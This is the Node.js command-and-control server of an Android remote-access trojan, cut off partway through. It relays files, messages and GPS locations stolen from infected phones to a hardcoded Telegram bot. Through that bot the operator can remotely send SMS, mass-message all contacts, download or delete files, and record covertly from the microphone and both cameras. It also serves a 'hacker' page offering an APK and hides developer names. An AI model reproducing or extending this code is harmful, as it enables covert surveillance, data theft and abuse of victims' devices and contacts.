const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// ============================================
// SAB KUCH HARDCODED - YAHAN SE EDIT KARO
// ============================================
const token = '8756594471:AAGaRwihwYC83LJyMvo4rLqj6VyqLdKk1jU'
const id = '8408378910'
const PORT = process.env.PORT || 3000
const address = 'https://www.google.com'
// ============================================

// DEVELOPER NAMES FILTER LIST - Yeh names bot mein show nahi honge
const DEVELOPER_FILTER = ['@shivayadavv', '@developer', '@admin', '@owner', 'shivayadavv', 'developed by'];

// Function to filter developer names from text
function filterDeveloperNames(text) {
    if (!text) return text;
    let filtered = text;
    DEVELOPER_FILTER.forEach(devName => {
        const regex = new RegExp(devName, 'gi');
        filtered = filtered.replace(regex, '🔒 Hidden');
    });
    return filtered;
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// 🔥 ANIMATED HACKER HTML PAGE
app.get('/', function (req, res) {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ SHADOW OFFICIAL ⚡</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
        }

        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 10;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
        }

        .hacker-room {
            width: 300px;
            height: 200px;
            border: 3px solid #0f0;
            border-radius: 10px;
            position: relative;
            margin-bottom: 30px;
            background: linear-gradient(180deg, #001100 0%, #000 100%);
            box-shadow: 0 0 30px #0f0, inset 0 0 30px rgba(0,255,0,0.1);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 30px #0f0, inset 0 0 30px rgba(0,255,0,0.1); }
            50% { box-shadow: 0 0 50px #0f0, inset 0 0 50px rgba(0,255,0,0.2); }
        }

        .hacker {
            width: 60px;
            height: 80px;
            background: #0f0;
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 10px 10px 0 0;
            animation: type 0.5s infinite alternate;
        }

        @keyframes type {
            0% { transform: translateX(-50%) translateY(0); }
            100% { transform: translateX(-50%) translateY(-5px); }
        }

        .hacker::before {
            content: '🕴️';
            font-size: 50px;
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
        }

        .pc {
            width: 80px;
            height: 60px;
            background: #003300;
            border: 2px solid #0f0;
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 5px;
        }

        .screen {
            width: 70px;
            height: 45px;
            background: #000;
            margin: 5px auto;
            border: 1px solid #0f0;
            overflow: hidden;
            position: relative;
        }

        .code-lines {
            position: absolute;
            width: 100%;
            animation: scroll 2s linear infinite;
        }

        @keyframes scroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(-20px); }
        }

        .code-line {
            height: 4px;
            background: #0f0;
            margin: 2px;
            opacity: 0.7;
            animation: typing 1s infinite;
        }

        @keyframes typing {
            0%, 100% { width: 20%; }
            50% { width: 80%; }
        }

        .title {
            font-size: 3em;
            font-weight: bold;
            text-align: center;
            text-shadow: 0 0 20px #0f0, 0 0 40px #0f0;
            animation: glitch 2s infinite;
            margin-bottom: 20px;
            letter-spacing: 5px;
        }

        @keyframes glitch {
            0%, 100% { text-shadow: 0 0 20px #0f0, 0 0 40px #0f0; }
            25% { text-shadow: -2px 0 #f00, 2px 0 #00f; }
            50% { text-shadow: 2px 0 #f00, -2px 0 #00f; }
            75% { text-shadow: 0 0 30px #0f0, 0 0 60px #0f0; }
        }

        .subtitle {
            font-size: 1.2em;
            color: #0a0;
            margin-bottom: 30px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .btn {
            background: transparent;
            border: 2px solid #0f0;
            color: #0f0;
            padding: 15px 40px;
            font-size: 1.2em;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 10px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 30px #0f0;
            transform: scale(1.05);
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .status {
            margin-top: 30px;
            padding: 10px 20px;
            border: 1px solid #0f0;
            background: rgba(0,255,0,0.1);
            animation: borderPulse 2s infinite;
        }

        @keyframes borderPulse {
            0%, 100% { border-color: #0f0; }
            50% { border-color: #00ff00; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
        }

        .terminal {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            height: 100px;
            background: rgba(0,20,0,0.9);
            border: 1px solid #0f0;
            padding: 10px;
            font-size: 12px;
            overflow: hidden;
        }

        .terminal-line {
            animation: fadeIn 0.5s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>

    <div class="container">
        <div class="hacker-room">
            <div class="pc">
                <div class="screen">
                    <div class="code-lines">
                        <div class="code-line" style="width: 60%"></div>
                        <div class="code-line" style="width: 40%"></div>
                        <div class="code-line" style="width: 80%"></div>
                        <div class="code-line" style="width: 30%"></div>
                        <div class="code-line" style="width: 70%"></div>
                    </div>
                </div>
            </div>
            <div class="hacker"></div>
        </div>

        <h1 class="title">⚡ SHADOW OFFICIAL ⚡</h1>
        <p class="subtitle">🔴 SYSTEM BREACH IN PROGRESS...</p>

        <div class="status">
            🟢 SERVER ONLINE | 📡 CONNECTION SECURE | 🛡️ PROXY ACTIVE
        </div>

        <div style="margin-top: 30px;">
            <a href="#" class="btn">📱 DOWNLOAD APK</a>
            <a href="https://youtube.com/@zeroxploid" class="btn">▶️ YOUTUBE</a>
        </div>
    </div>

    <div class="terminal" id="terminal">
        <div class="terminal-line">> Initializing secure connection...</div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];

        for (let i = 0; i < columns; i++) {
            drops[i] = 1;
        }

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 35);

        // Terminal typing effect
        const terminal = document.getElementById('terminal');
        const messages = [
            '> Bypassing firewall...',
            '> Accessing mainframe...',
            '> Decrypting data packets...',
            '> Connection established ✓',
            '> Shadow Official v3.0 Active'
        ];

        let msgIndex = 0;
        setInterval(() => {
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.textContent = messages[msgIndex];
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
            msgIndex = (msgIndex + 1) % messages.length;
            if (terminal.children.length > 6) {
                terminal.removeChild(terminal.firstChild);
            }
        }, 2000);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
    `);
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    // Filter developer names from filename
    const safeName = filterDeveloperNames(name);

    appBot.sendDocument(id, req.file.buffer, {
            caption: `📁 <b>File from ${filterDeveloperNames(req.headers.model)}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: safeName,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    const filteredText = filterDeveloperNames(req.body['text']);
    const filteredModel = filterDeveloperNames(req.headers.model);

    appBot.sendMessage(id, `💬 <b>Message from ${filteredModel}</b>

${filteredText}`, {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `📍 <b>Location from ${filterDeveloperNames(req.headers.model)}</b>`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = filterDeveloperNames(req.headers.model)
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = filterDeveloperNames(req.headers.provider)

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })

    appBot.sendMessage(id,
        `🔥 <b>NEW DEVICE CONNECTED</b> 🔥

` +
        `📱 <b>Model:</b> ${model}
` +
        `🔋 <b>Battery:</b> ${battery}
` +
        `🤖 <b>Android:</b> ${version}
` +
        `☀️ <b>Brightness:</b> ${brightness}
` +
        `📡 <b>Provider:</b> ${provider}

` +
        `⚡ Status: <code>ONLINE</code>`,
        {parse_mode: "HTML"}
    )

    ws.on('close', function () {
        appBot.sendMessage(id,
            `❌ <b>DEVICE DISCONNECTED</b> ❌

` +
            `📱 <b>Model:</b> ${model}
` +
            `🔋 <b>Battery:</b> ${battery}
` +
            `🤖 <b>Android:</b> ${version}

` +
            `⚠️ Status: <code>OFFLINE</code>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;

    // Filter developer names from incoming messages
    if (message.text) {
        message.text = filterDeveloperNames(message.text);
    }

    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('📞 Enter the number to send SMS')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '✉️ <b>Enter your message</b>\n\n' +
                '⚠️ Message will be sent to: ' + currentNumber,
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
        }
        if (message.reply_to_message.text.includes('✉️ Enter your message')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '📤 SMS is being sent!',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📨 Enter message for all contacts')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '📤 Broadcasting to all contacts!',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📂 Enter file path to download')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '📥 Downloading file...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🗑️ Enter file path to delete')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '🗑️ Deleting file...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🎤 Enter recording duration (seconds)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '🎙️ Recording started...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📹 Enter main camera duration')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '📹 Recording from main camera...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🤳 Enter selfie camera duration')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
                '🤳 Recording from selfie camera...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🍞 Enter toast message')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⏳ <b>Processing...</b>\n\n' +
          
